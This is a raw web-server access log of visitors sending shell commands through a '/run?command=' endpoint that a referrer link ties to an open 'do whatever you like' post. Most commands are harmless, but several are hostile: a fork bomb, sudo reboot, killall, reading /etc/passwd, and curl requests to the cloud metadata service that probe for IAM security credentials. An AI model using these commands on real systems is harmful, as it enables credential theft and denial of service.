82.102.31.138 - - [19/Jan/2015:13:15:18 +0000] "GET /run?command=cd%20etc HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
82.102.31.138 - - [19/Jan/2015:13:15:21 +0000] "GET /run?command=cd%20etc HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:15:23 +0000] "GET /run?command=echo%20%22nc%20-vvnlp%22%20%3C%20echo%20%22test%22 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
31.16.77.135 - - [19/Jan/2015:13:15:25 +0000] "GET /run?command=echo%20%22nc%20-vvnlp%22%20%3E%20echo%20%22test%22 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
200.34.141.250 - - [19/Jan/2015:13:15:26 +0000] "GET /run?command=killall%20-v HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.102.31.138 - - [19/Jan/2015:13:15:26 +0000] "GET /run?command=cd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:15:27 +0000] "GET /run?command=netstat%20-an%20|%20grep%20:22 HTTP/1.1" 200 240 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:15:30 +0000] "GET /run?command=:(){%20:|:%20&%20};: HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
31.16.77.135 - - [19/Jan/2015:13:15:31 +0000] "GET /run?command=echo%20%22test%22 HTTP/1.1" 200 5 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
200.34.141.250 - - [19/Jan/2015:13:15:33 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:15:35 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
200.34.141.250 - - [19/Jan/2015:13:15:46 +0000] "GET /run?command=cd%20bin HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:15:47 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:15:48 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:15:48 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
148.235.187.243 - - [19/Jan/2015:13:15:53 +0000] "GET /run?command=cd%20bin;%20ls HTTP/1.1" 200 606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:15:54 +0000] "GET /run?command=lsof%20-ni%20|%20grep%20ssh HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:16:14 +0000] "GET /run?command=factor%20132321321 HTTP/1.1" 200 54 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:16:18 +0000] "GET /run?command=factor%2013232132121321321321 HTTP/1.1" 200 56 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:16:21 +0000] "GET /run?command=factor%201323213212132132132112321321321321321 HTTP/1.1" 200 84 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
82.132.219.204 - - [19/Jan/2015:13:16:22 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 4.4.4; HTC One_M8 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36"
82.132.219.204 - - [19/Jan/2015:13:16:22 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 4.4.4; HTC One_M8 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.93 Mobile Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:16:25 +0000] "GET /run?command=factor%20132321321213213213211232132132132132123243585454 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:16:29 +0000] "GET /run?command=factor%2013232132121321321321545849568546954654986548965498 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:16:33 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
80.187.112.130 - - [19/Jan/2015:13:16:39 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "AlienBlue/2.9.1 CFNetwork/711.1.12 Darwin/14.0.0"
80.187.112.130 - - [19/Jan/2015:13:16:39 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B411"
213.74.127.134 - - [19/Jan/2015:13:16:53 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/user-data HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:17:17 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/dynamic/ HTTP/1.1" 200 19 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
204.110.218.7 - - [19/Jan/2015:13:17:17 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
204.110.218.7 - - [19/Jan/2015:13:17:18 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
204.110.218.7 - - [19/Jan/2015:13:17:18 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
204.110.218.7 - - [19/Jan/2015:13:17:27 +0000] "GET /run?command=uptime HTTP/1.1" 200 85 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:17:32 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/dynamic/instance-identity/ HTTP/1.1" 200 56 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
166.216.165.128 - - [19/Jan/2015:13:17:33 +0000] "GET /apple-touch-icon.png HTTP/1.1" 404 233 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
204.110.218.7 - - [19/Jan/2015:13:17:34 +0000] "GET /run?command=ss HTTP/1.1" 200 527 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:17:35 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/dynamic/instance-identity/ HTTP/1.1" 200 56 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:17:41 +0000] "GET /run?command=uptime HTTP/1.1" 200 83 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
204.110.218.7 - - [19/Jan/2015:13:17:43 +0000] "GET /run?command=tcpdump HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:17:45 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/dynamic/instance-identity/pkcs7 HTTP/1.1" 200 724 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:17:50 +0000] "GET /run?command=apt-get HTTP/1.1" 200 959 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:17:51 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
212.146.112.30 - - [19/Jan/2015:13:17:52 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
212.146.112.30 - - [19/Jan/2015:13:17:52 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:17:57 +0000] "GET /run?command=apt-get%20install HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:18:00 +0000] "GET /run?command=apt-get%20install HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:18:06 +0000] "GET /run?command=sudo HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:18:11 +0000] "GET /run?command=sudo%20su HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:18:14 +0000] "GET /run?command=echo%20hej HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:18:21 +0000] "GET /run?command=su HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
78.172.44.50 - - [19/Jan/2015:13:18:23 +0000] "GET /run?command=sudo%20reboot HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
78.172.44.50 - - [19/Jan/2015:13:18:36 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0"
213.74.127.134 - - [19/Jan/2015:13:18:43 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ami-launch-index HTTP/1.1" 200 1 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:19:06 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ami-id HTTP/1.1" 200 12 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:19:20 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "http://www.reddit.com/r/hacking/comments/2sv2jh/this_is_running_on_my_server_do_whatever_you_like/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:19:23 +0000] "GET /run?command=78.172.44.50 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:19:26 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ami-manifest-path HTTP/1.1" 200 9 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
194.25.90.180 - - [19/Jan/2015:13:19:29 +0000] "GET /run?command=netstat%20-an%20|%20grep%20:22 HTTP/1.1" 200 240 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
150.70.173.11 - - [19/Jan/2015:13:19:37 +0000] "GET /run?command=uptime HTTP/1.1" 200 61 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
188.181.211.34 - - [19/Jan/2015:13:19:46 +0000] "GET /run?command=%20 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:19:49 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/iam/info HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:19:49 +0000] "GET /run?command=cd%20.. HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:19:53 +0000] "GET /run?command=cd%20var HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:19:55 +0000] "GET /run?command=cd%20var HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:19:59 +0000] "GET /run?command=cd%20var;echo%20hej HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:20:01 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:20:03 +0000] "GET /run?command=cd%20var;ls HTTP/1.1" 200 82 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:20:12 +0000] "GET /run?command=cd%20var;ls;cd%20mail;ls HTTP/1.1" 200 82 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:20:17 +0000] "GET /run?command=cd%20var;cd%20mail;ls HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
88.217.181.151 - - [19/Jan/2015:13:20:17 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; CrOS x86_64 6457.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
88.217.181.151 - - [19/Jan/2015:13:20:18 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; CrOS x86_64 6457.68.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
150.70.173.5 - - [19/Jan/2015:13:20:20 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
188.181.211.34 - - [19/Jan/2015:13:20:22 +0000] "GET /run?command=ls%20/var/mail HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
150.70.173.41 - - [19/Jan/2015:13:20:24 +0000] "GET /run?command=sudo%20reboot HTTP/1.1" 200 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
188.181.211.34 - - [19/Jan/2015:13:20:25 +0000] "GET /run?command=ls%20/var/mail/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:20:28 +0000] "GET /run?command=ls%20/var HTTP/1.1" 200 82 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:20:33 +0000] "GET /run?command=ls%20/ HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
92.69.244.105 - - [19/Jan/2015:13:20:38 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B440"
188.181.211.34 - - [19/Jan/2015:13:20:42 +0000] "GET /run?command=ls%20/var HTTP/1.1" 200 82 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:20:45 +0000] "GET /run?command=ls%20/var/log HTTP/1.1" 200 161 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:21:32 +0000] "GET /run?command=ls%20/var/log/nginx HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:21:35 +0000] "GET /run?command=cat%20/var/log/nginx HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:21:42 +0000] "GET /run?command=cat%20* HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:21:46 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:22:05 +0000] "GET /run?command=mkdir%20neh HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
86.182.224.103 - - [19/Jan/2015:13:22:06 +0000] "GET / HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
86.182.224.103 - - [19/Jan/2015:13:22:06 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:22:11 +0000] "GET /run?command=mkdir%20/var/lol HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
86.182.224.103 - - [19/Jan/2015:13:22:15 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
188.181.211.34 - - [19/Jan/2015:13:22:17 +0000] "GET /run?command=ls%20var HTTP/1.1" 200 82 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
78.23.1.23 - - [19/Jan/2015:13:22:30 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 4.4.4; GT-N7000 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
78.23.1.23 - - [19/Jan/2015:13:22:30 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 4.4.4; GT-N7000 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:23:08 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/instance-shutdown HTTP/1.1" 200 257 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:23:11 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:23:18 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/instance-action HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:23:22 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/instance-action/shutdown HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:23:25 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/instance-action/shutdown HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
213.74.127.134 - - [19/Jan/2015:13:23:29 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/instance-action/none HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
5.151.222.72 - - [19/Jan/2015:13:23:32 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
5.151.222.72 - - [19/Jan/2015:13:23:32 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:23:33 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
213.74.127.134 - - [19/Jan/2015:13:23:34 +0000] "GET /run?command=curl%20http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
188.207.241.66 - - [19/Jan/2015:13:23:38 +0000] "GET /run?command=ls%20bin HTTP/1.1" 200 606 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:23:43 +0000] "GET /run?command=ls%20bin%27 HTTP/1.1" 200 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:23:53 +0000] "GET /run?command=cat%20/etc/passwd HTTP/1.1" 200 540 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:24:03 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:24:15 +0000] "GET /run?command=cat%20/etc/hostname HTTP/1.1" 200 16 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
188.207.241.66 - - [19/Jan/2015:13:24:26 +0000] "GET /run?command=cat%20/etc/issue HTTP/1.1" 200 57 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0"
